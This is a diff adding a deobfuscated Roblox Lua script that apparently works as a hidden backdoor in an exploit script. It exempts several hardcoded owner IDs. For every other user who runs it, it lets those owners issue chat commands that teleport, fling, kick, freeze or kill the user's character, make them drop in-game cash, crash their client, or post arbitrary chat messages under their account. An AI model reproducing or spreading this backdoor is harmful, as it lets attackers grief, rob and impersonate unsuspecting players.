@@ -1,0 +1,133 @@
+-- skido deobfuscation
+local l_Players_0 = game:GetService("Players");
+local l_TextChatService_0 = game:GetService("TextChatService");
+local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage");
+local l_TeleportService_0 = game:GetService("TeleportService");
+local v4 = {
+    8336437998, 
+    42636633, 
+    7272929129
+};
+local function v6(v5) --[[ Line: 0 ]] --[[ Name:  ]]
+    return getgenv().ownerIDs[v5] ~= nil;
+end;
+local function v10(v7) --[[ Line: 0 ]] --[[ Name:  ]]
+    -- upvalues: v4 (ref)
+    for _, v9 in ipairs(v4) do
+        if v7 == v9 then
+            return true;
+        end;
+    end;
+    return false;
+end;
+local l_LocalPlayer_0 = game:GetService("Players").LocalPlayer;
+if l_LocalPlayer_0 and (v6(l_LocalPlayer_0.UserId) or v10(l_LocalPlayer_0.UserId)) then
+    print("true");
+    return;
+else
+    local _ = function(v12) --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: l_Players_0 (ref)
+        local v13 = {};
+        v12 = v12:lower();
+        for _, v15 in ipairs(l_Players_0:GetPlayers()) do
+            if v12 == "." or v15.Name:lower():find(v12) or v15.DisplayName:lower():find(v12) then
+                table.insert(v13, v15);
+            end;
+        end;
+        return v13;
+    end;
+    local v17 = false;
+    local v18 = nil;
+    local v19 = nil;
+    local v20 = nil;
+    local v21 = nil;
+    local function v39(v22, v23) --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: l_Players_0 (ref), v6 (ref), l_ReplicatedStorage_0 (ref), l_TeleportService_0 (ref), v20 (ref), v21 (ref), v19 (ref), v17 (ref), v18 (ref), l_TextChatService_0 (ref)
+        local v24, v25 = v23:match("^:(%S+)%s*(.*)");
+        if not v24 then
+            return;
+        else
+            local l_LocalPlayer_1 = l_Players_0.LocalPlayer;
+            local function v28(v27) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_1 (ref)
+                return v27 == "." or l_LocalPlayer_1.Name:lower():find(v27:lower()) or l_LocalPlayer_1.DisplayName:lower():find(v27:lower());
+            end;
+            if not v6(v22.UserId) then
+                return;
+            else
+                if v25 and v28(v25) then
+                    if v24 == "bring" then
+                        if v22.Character and v22.Character:FindFirstChild("HumanoidRootPart") and l_LocalPlayer_1.Character and l_LocalPlayer_1.Character:FindFirstChild("HumanoidRootPart") then
+                            l_LocalPlayer_1.Character.HumanoidRootPart.CFrame = v22.Character.HumanoidRootPart.CFrame;
+                        end;
+                    elseif v24 == "fling" then
+                        if l_LocalPlayer_1.Character and l_LocalPlayer_1.Character:FindFirstChild("HumanoidRootPart") then
+                            l_LocalPlayer_1.Character.HumanoidRootPart.CFrame = CFrame.new(math.huge, math.huge, math.huge);
+                        end;
+                    elseif v24 == "kick" then
+                        l_LocalPlayer_1:Kick("You have been kicked by an owner.");
+                    elseif v24 == "ban" then
+                        l_LocalPlayer_1:Kick("PERMA-BAN by owner.");
+                    elseif v24 == "freeze" then
+                        if l_LocalPlayer_1.Character and l_LocalPlayer_1.Character:FindFirstChild("LowerTorso") then
+                            l_LocalPlayer_1.Character.LowerTorso.Anchored = true;
+                        end;
+                    elseif v24 == "unfreeze" then
+                        if l_LocalPlayer_1.Character and l_LocalPlayer_1.Character:FindFirstChild("LowerTorso") then
+                            l_LocalPlayer_1.Character.LowerTorso.Anchored = false;
+                        end;
+                    elseif v24 == "reset" then
+                        if l_LocalPlayer_1.Character and l_LocalPlayer_1.Character:FindFirstChild("Humanoid") then
+                            l_LocalPlayer_1.Character.Humanoid.Health = 0;
+                        end;
+                    elseif v24 == "dropcash" then
+                        local l_MainEvent_0 = l_ReplicatedStorage_0:FindFirstChild("MainEvent");
+                        if l_MainEvent_0 then
+                            l_MainEvent_0:FireServer("DropMoney", "12000");
+                        end;
+                    elseif v24 == "rejoin" then
+                        l_TeleportService_0:Teleport(game.PlaceId, l_LocalPlayer_1);
+                    elseif v24 == "crash" then
+                        while true do
+
+                        end;
+                    end;
+                end;
+                if v24 == "say" and v25 then
+                    local v30 = v25:find(" ");
+                    if v30 then
+                        local v31 = v25:sub(1, v30 - 1);
+                        local v32 = v25:sub(v30 + 1);
+                        do
+                            local l_v32_0 = v32;
+                            if v28(v31) and l_v32_0 ~= "" then
+                                local l_TextChannels_0 = l_TextChatService_0:FindFirstChild("TextChannels");
+                                local v35 = l_TextChannels_0 and l_TextChannels_0:FindFirstChild("RBXGeneral");
+                                do
+                                    local l_v35_0 = v35;
+                                    if l_v35_0 then
+                                        local _, _ = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                                            -- upvalues: l_v35_0 (ref), l_v32_0 (ref)
+                                            l_v35_0:SendAsync(l_v32_0);
+                                        end);
+                                    end;
+                                end;
+                            end;
+                        end;
+                    end;
+                end;
+                return;
+            end;
+        end;
+    end;
+    l_TextChatService_0.MessageReceived:Connect(function(v40) --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: l_Players_0 (ref), v39 (ref)
+        if v40 and v40.Text and v40.TextSource and v40.TextSource.UserId then
+            local l_l_Players_0_PlayerByUserId_0 = l_Players_0:GetPlayerByUserId(v40.TextSource.UserId);
+            if l_l_Players_0_PlayerByUserId_0 then
+                v39(l_l_Players_0_PlayerByUserId_0, v40.Text);
+            end;
+        end;
+    end);
+    return;
+end;
